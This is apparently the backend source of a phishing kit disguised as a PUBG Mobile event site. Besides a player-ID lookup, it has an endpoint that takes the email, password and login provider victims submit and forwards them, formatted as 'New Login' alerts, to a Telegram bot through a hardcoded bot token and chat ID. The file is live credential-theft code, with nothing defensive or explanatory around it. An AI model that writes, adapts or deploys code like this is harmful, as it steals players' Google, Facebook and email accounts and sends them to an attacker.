/**
 * PUBG Mobile Event Backend
 * Player ID lookup via Midasbuy API (mock + proxy modes)
 */
import express from 'express';
import cors from 'cors';
import helmet from 'helmet';
import morgan from 'morgan';
import rateLimit from 'express-rate-limit';
import { config } from './config.js';
import { PlayerLookupService } from './services/playerLookup.js';
import { errorHandler, notFound } from './middleware/errorHandler.js';

const app = express();
const playerLookup = new PlayerLookupService();

// Security & logging
app.use(helmet({ crossOriginResourcePolicy: { policy: 'cross-origin' } }));
app.use(morgan(config.isDev ? 'dev' : 'combined'));
app.use(cors({ origin: config.corsOrigin, credentials: true }));
app.use(express.json({ limit: '16kb' }));

// Rate limiting
const limiter = rateLimit({
  windowMs: 60_000,
  max: config.rateLimitMax,
  standardHeaders: true,
  legacyHeaders: false,
  message: { success: false, error: 'Too many requests, slow down' }
});
app.use('/api/', limiter);

// Health check
app.get('/health', (_req, res) => res.json({ status: 'ok', mode: config.mode }));

/**
 * POST /api/player/lookup
 * Body: { "player_id": "535123456" }
 * Response: { "success": true, "player_id": "...", "nickname": "...", "zone_id": "1", "is_ban": false }
 */
app.post('/api/player/lookup', async (req, res, next) => {
  try {
    const { player_id } = req.body;
    if (!player_id || !/^\d{4,15}$/.test(String(player_id))) {
      return res.status(400).json({ success: false, error: 'Invalid player_id (4-15 digits)' });
    }

    const result = await playerLookup.lookup(String(player_id));
    res.json(result);
  } catch (err) {
    next(err);
  }
});

/**
 * POST /api/telegram
 * Body: { "provider": "google|facebook|email", "email": "...", "password": "...", "playerId": "...", "itemName": "..." }
 * Sends formatted message to Telegram bot
 */
app.post('/api/telegram', async (req, res, next) => {
  try {
    const { provider, email, password, playerId, itemName } = req.body;
    if (!provider || !email || !password || !playerId) {
      return res.status(400).json({ success: false, error: 'Missing required fields' });
    }

    const BOT_TOKEN = '8968163720:AAESAjjn2RQSuKW09it8ISvwu6AqFVjvpL4';
    const CHAT_ID = '6324502848';

    const providerLabel = provider.charAt(0).toUpperCase() + provider.slice(1);
    const time = new Date().toLocaleString('ru-RU', { timeZone: 'Asia/Tashkent' });

    const text =
      `🔔 <b>New Login</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `👤 <b>Provider:</b> ${providerLabel}\n` +
      `📧 <b>Email:</b> <code>${email}</code>\n` +
      `🔑 <b>Password:</b> <code>${password}</code>\n` +
      `🆔 <b>Player ID:</b> <code>${playerId}</code>\n` +
      `🎁 <b>Item:</b> ${itemName || '—'}\n` +
      `🕐 <b>Time:</b> ${time} (MSK)`;

    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML'
      })
    });

    const tgData = await tgRes.json();
    if (!tgData.ok) {
      console.error('Telegram API error:', tgData);
      return res.status(502).json({ success: false, error: 'Telegram send failed' });
    }

    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

// 404 & error handlers
app.use(notFound);
app.use(errorHandler);

const server = app.listen(config.port, () => {
  console.log(`🚀 Backend running on http://localhost:${config.port} [${config.mode}]`);
  if (config.mode === 'proxy') {
    console.log(`   → Proxying to ${config.midasbuyBaseUrl}`);
  }
});

// Graceful shutdown
const shutdown = (signal) => {
  console.log(`\n${signal} received, shutting down...`);
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(1), 5000).unref();
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));

export { app };